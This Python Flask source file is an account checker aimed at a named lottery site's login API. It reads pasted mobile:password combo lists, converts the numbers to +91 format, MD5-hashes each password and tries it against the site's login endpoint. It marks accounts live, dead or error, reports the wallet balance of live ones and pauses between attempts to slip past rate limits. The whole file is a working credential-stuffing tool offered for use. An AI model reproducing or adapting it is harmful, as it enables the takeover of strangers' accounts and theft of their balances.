from flask import Flask, render_template, request, jsonify
import requests
import hashlib
import time

app = Flask(__name__)

BASE = "https://mantripk.com/lottery-backend/glserver/user/"

def md5(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest()

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/check', methods=['POST'])
def check():
    data = request.json
    combos = data.get('combos', '').strip().splitlines()
    
    results = []
    live = 0

    for line in combos:
        if not line or ':' not in line:
            continue
            
        mobile, password = [x.strip() for x in line.split(':', 1)]
        
        mobile = mobile.replace(" ", "").replace("-", "")
        if not mobile.startswith("+91"):
            mobile = "+91" + mobile.lstrip("0")

        hashed = md5(password)

        try:
            r = requests.post(BASE + "login", 
                            params={"mobile": mobile, "password": hashed}, 
                            headers={"User-Agent": "Mozilla/5.0"}, 
                            timeout=10)
            
            if r.status_code == 200:
                res = r.json()
                if res.get("res") == 1:
                    balance = res.get("obj", {}).get("balance", 0)
                    results.append([mobile, "✅ LIVE", balance, "Success"])
                    live += 1
                else:
                    results.append([mobile, "❌ DEAD", "-", res.get("resMsg", "")])
            else:
                results.append([mobile, "❌ DEAD", "-", f"HTTP {r.status_code}"])
        except Exception as e:
            results.append([mobile, "❌ ERROR", "-", str(e)[:100]])

        time.sleep(5)

    return jsonify({
        "live": live,
        "total": len(results),
        "results": results
    })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
